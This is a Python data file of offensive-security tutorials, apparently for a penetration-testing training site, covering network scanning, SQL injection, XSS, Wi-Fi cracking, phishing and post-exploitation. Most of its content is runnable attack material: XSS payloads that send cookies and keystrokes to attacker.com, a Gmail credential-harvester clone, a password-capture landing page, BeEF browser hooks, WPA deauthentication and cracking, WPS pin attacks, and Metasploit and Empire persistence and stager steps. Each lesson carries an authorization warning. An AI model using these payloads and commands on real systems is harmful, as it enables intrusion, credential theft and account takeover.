TUTORIALS = [
    {
        'id': 'network-reconnaissance',
        'title': 'Advanced Network Reconnaissance',
        'description': 'Master advanced techniques for network discovery and enumeration using Kali Linux tools',
        'difficulty': 'Advanced',
        'duration': '45 minutes',
        'category': 'Reconnaissance',
        'tools': ['nmap', 'masscan', 'zmap', 'unicornscan'],
        'warning': 'Only perform these techniques on networks you own or have explicit permission to test.',
        'steps': [
            {
                'title': 'Advanced Nmap Scanning Techniques',
                'content': 'Learn to use advanced Nmap flags for stealth and comprehensive scanning.',
                'code': '''# TCP SYN stealth scan with OS detection
nmap -sS -O -sV --script=vuln target_ip

# UDP scan for common services
nmap -sU --top-ports 1000 target_ip

# Comprehensive scan with NSE scripts
nmap -sC -sV -A --script=default,discovery,safe target_ip

# Timing templates for different scenarios
nmap -T4 -sS target_ip  # Aggressive timing
nmap -T1 -sS target_ip  # Paranoid (very slow)''',
                'explanation': 'These commands demonstrate various Nmap scanning techniques for different scenarios and stealth levels.'
            },
            {
                'title': 'Masscan for Large Network Ranges',
                'content': 'Use Masscan for high-speed port scanning of large network ranges.',
                'code': '''# Fast scan of entire Class C network
masscan -p1-65535 192.168.1.0/24 --rate=1000

# Scan specific ports across multiple networks
masscan -p80,443,22,21 10.0.0.0/8 --rate=10000

# Output results in XML format
masscan -p1-1000 192.168.1.0/24 --rate=1000 -oX scan_results.xml''',
                'explanation': 'Masscan is ideal for scanning large network ranges quickly, but requires careful rate limiting to avoid network congestion.'
            },
            {
                'title': 'Zmap for Internet-Wide Scanning',
                'content': 'Learn to use Zmap for scanning the entire IPv4 address space.',
                'code': '''# Scan entire internet for port 80
zmap -p 80 -o results.txt

# Scan with bandwidth limiting
zmap -p 443 -B 10M -o https_hosts.txt

# Scan specific networks
echo "192.168.0.0/16" | zmap -p 22''',
                'explanation': 'Zmap is designed for Internet-wide scanning. Use responsibly and consider the ethical implications.'
            }
        ]
    },
    {
        'id': 'web-application-testing',
        'title': 'Advanced Web Application Penetration Testing',
        'description': 'Comprehensive guide to advanced web application security testing techniques',
        'difficulty': 'Expert',
        'duration': '60 minutes',
        'category': 'Web Security',
        'tools': ['burp-suite', 'sqlmap', 'gobuster', 'nikto'],
        'warning': 'These techniques should only be used on applications you own or have written authorization to test.',
        'steps': [
            {
                'title': 'Advanced SQL Injection Techniques',
                'content': 'Explore advanced SQL injection methods beyond basic union attacks.',
                'code': '''# Boolean-based blind SQL injection
sqlmap -u "http://target.com/page?id=1" --technique=B --dbs

# Time-based blind SQL injection
sqlmap -u "http://target.com/page?id=1" --technique=T --dbs

# Second-order SQL injection
sqlmap -u "http://target.com/login" --data="username=admin&password=pass" --second-order="http://target.com/profile"

# WAF bypass techniques
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,charencode''',
                'explanation': 'Advanced SQL injection techniques for bypassing filters and exploiting blind injection vulnerabilities.'
            },
            {
                'title': 'Directory and File Enumeration',
                'content': 'Advanced techniques for discovering hidden files and directories.',
                'code': '''# Gobuster with custom wordlist and extensions
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js

# Recursive directory brute forcing
gobuster dir -u http://target.com -w wordlist.txt -r

# Virtual host enumeration
gobuster vhost -u http://target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# API endpoint discovery
gobuster dir -u http://target.com/api -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints.txt''',
                'explanation': 'These commands help discover hidden content and API endpoints that might contain vulnerabilities.'
            },
            {
                'title': 'Advanced XSS Exploitation',
                'content': 'Sophisticated cross-site scripting attack vectors and bypasses.',
                'code': '''# DOM-based XSS payload
<img src=x onerror="alert(document.domain)">

# Filter bypass techniques
<svg onload="alert(1)">
<details open ontoggle="alert(1)">
<marquee onstart="alert(1)">

# Cookie stealing payload
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>

# Keylogger payload
<script>document.onkeypress=function(e){fetch('http://attacker.com/keys?key='+String.fromCharCode(e.which))}</script>''',
                'explanation': 'Advanced XSS payloads for various scenarios and filter bypass techniques.'
            }
        ]
    },
    {
        'id': 'wireless-security',
        'title': 'Advanced Wireless Network Security Testing',
        'description': 'Comprehensive wireless security assessment techniques using Kali Linux',
        'difficulty': 'Advanced',
        'duration': '50 minutes',
        'category': 'Wireless',
        'tools': ['aircrack-ng', 'reaver', 'hashcat', 'kismet'],
        'warning': 'Only test wireless networks you own or have explicit written permission to test.',
        'steps': [
            {
                'title': 'Monitor Mode and Interface Setup',
                'content': 'Properly configure wireless interfaces for monitoring and injection.',
                'code': '''# Check wireless interfaces
iwconfig

# Kill interfering processes
airmon-ng check kill

# Enable monitor mode
airmon-ng start wlan0

# Verify monitor mode
iwconfig wlan0mon

# Set specific channel
iwconfig wlan0mon channel 6''',
                'explanation': 'Proper interface configuration is crucial for wireless security testing.'
            },
            {
                'title': 'WPA/WPA2 Security Assessment',
                'content': 'Advanced techniques for testing WPA/WPA2 security.',
                'code': '''# Capture handshakes
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauthentication attack
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# Dictionary attack on captured handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Hashcat attack on handshake
hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt''',
                'explanation': 'These commands demonstrate WPA/WPA2 security testing through handshake capture and cracking.'
            },
            {
                'title': 'WPS Pin Attack',
                'content': 'Exploit WPS vulnerabilities using Reaver and Bully.',
                'code': '''# Check for WPS-enabled networks
wash -i wlan0mon

# Reaver WPS pin attack
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Bully WPS attack with delay
bully -b AA:BB:CC:DD:EE:FF -e NETWORK_NAME -c 6 -d 2 wlan0mon

# Pixie dust attack
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K''',
                'explanation': 'WPS attacks can be effective against routers with WPS enabled and vulnerable implementations.'
            }
        ]
    },
    {
        'id': 'social-engineering',
        'title': 'Advanced Social Engineering Techniques',
        'description': 'Psychological manipulation techniques and technical implementation for security testing',
        'difficulty': 'Expert',
        'duration': '40 minutes',
        'category': 'Social Engineering',
        'tools': ['set', 'gophish', 'beef', 'maltego'],
        'warning': 'Social engineering techniques must only be used for authorized security assessments with proper consent.',
        'steps': [
            {
                'title': 'Social Engineering Toolkit (SET)',
                'content': 'Use SET for creating convincing phishing campaigns.',
                'code': '''# Start Social Engineering Toolkit
setoolkit

# Create spear-phishing attack
# Select option 1: Social-Engineering Attacks
# Select option 2: Website Attack Vectors
# Select option 3: Credential Harvester Attack Method
# Select option 2: Site Cloner

# Example configuration:
# IP address: 192.168.1.100
# URL to clone: https://gmail.com

# Monitor harvested credentials
tail -f /root/.set/reports/''',
                'explanation': 'SET provides a framework for creating realistic phishing attacks for security awareness testing.'
            },
            {
                'title': 'Advanced Phishing with Gophish',
                'content': 'Create sophisticated phishing campaigns with tracking and analytics.',
                'code': '''# Install and start Gophish
wget https://github.com/gophish/gophish/releases/download/v0.11.0/gophish-v0.11.0-linux-64bit.zip
unzip gophish-v0.11.0-linux-64bit.zip
chmod +x gophish
./gophish

# Access admin panel at https://localhost:3333
# Default credentials: admin:gophish

# Create email template with tracking
Subject: Important Security Update Required
Body: Please click <a href="{{.URL}}">here</a> to update your account.

# Landing page with credential capture
<form method="POST" action="/">
    Username: <input type="text" name="username">
    Password: <input type="password" name="password">
    <input type="submit" value="Login">
</form>''',
                'explanation': 'Gophish provides professional phishing campaign management with detailed analytics.'
            },
            {
                'title': 'Browser Exploitation Framework (BeEF)',
                'content': 'Hook browsers and perform client-side attacks.',
                'code': '''# Start BeEF
beef-xss

# Access BeEF panel at http://localhost:3000/ui/panel
# Default credentials: beef:beef

# Hook payload for injection
<script src="http://192.168.1.100:3000/hook.js"></script>

# Alternative hook methods:
# Image tag: <img src="http://192.168.1.100:3000/hook.js">
# Iframe: <iframe src="http://192.168.1.100:3000/demos/basic.html">

# Common BeEF modules to execute:
# - Get Cookie
# - Get System Info
# - Redirect Browser
# - Create Alert Dialog
# - Webcam Permission Check''',
                'explanation': 'BeEF allows testing of client-side vulnerabilities through browser hooking and exploitation.'
            }
        ]
    },
    {
        'id': 'post-exploitation',
        'title': 'Advanced Post-Exploitation Techniques',
        'description': 'Comprehensive guide to maintaining access and lateral movement in compromised systems',
        'difficulty': 'Expert',
        'duration': '55 minutes',
        'category': 'Post-Exploitation',
        'tools': ['metasploit', 'empire', 'covenant', 'bloodhound'],
        'warning': 'Post-exploitation techniques should only be performed on systems you own or have explicit authorization to test.',
        'steps': [
            {
                'title': 'Metasploit Post-Exploitation Modules',
                'content': 'Advanced Metasploit techniques for post-exploitation activities.',
                'code': '''# Start Metasploit console
msfconsole

# Load post-exploitation modules after getting meterpreter session
use post/windows/gather/enum_system
set SESSION 1
run

# Privilege escalation
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Persistence techniques
use post/windows/manage/persistence_exe
set SESSION 1
set REXEPATH /root/backdoor.exe
run

# Lateral movement
use post/windows/gather/enum_domain
set SESSION 1
run''',
                'explanation': 'Metasploit provides comprehensive post-exploitation modules for various operating systems.'
            },
            {
                'title': 'PowerShell Empire for Windows',
                'content': 'Use PowerShell Empire for advanced Windows post-exploitation.',
                'code': '''# Start Empire server
./empire --rest

# Create listener
listeners
uselistener http
set Host 192.168.1.100
set Port 8080
execute

# Generate stager
usestager windows/launcher_bat
set Listener http
generate

# Execute on target and interact with agent
agents
interact AGENT_NAME

# Common Empire modules
usemodule situational_awareness/network/powerview/get_domain_controller
usemodule collection/browser_data
usemodule persistence/elevated/registry''',
                'explanation': 'PowerShell Empire provides a post-exploitation framework specifically designed for Windows environments.'
            },
            {
                'title': 'BloodHound for Active Directory',
                'content': 'Map Active Directory environments and find attack paths.',
                'code': '''# Start Neo4j database
neo4j start

# Start BloodHound
./BloodHound --no-sandbox

# Collect data using SharpHound
.\SharpHound.exe -c All -d domain.local

# Alternative collection with PowerShell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain domain.local

# Common queries in BloodHound:
# - Find all Domain Admins
# - Find Shortest Paths to Domain Admins
# - Find Computers with Unconstrained Delegation
# - Find Users with DCSync Rights''',
                'explanation': 'BloodHound helps identify attack paths in Active Directory environments through graph analysis.'
            }
        ]
    }
]
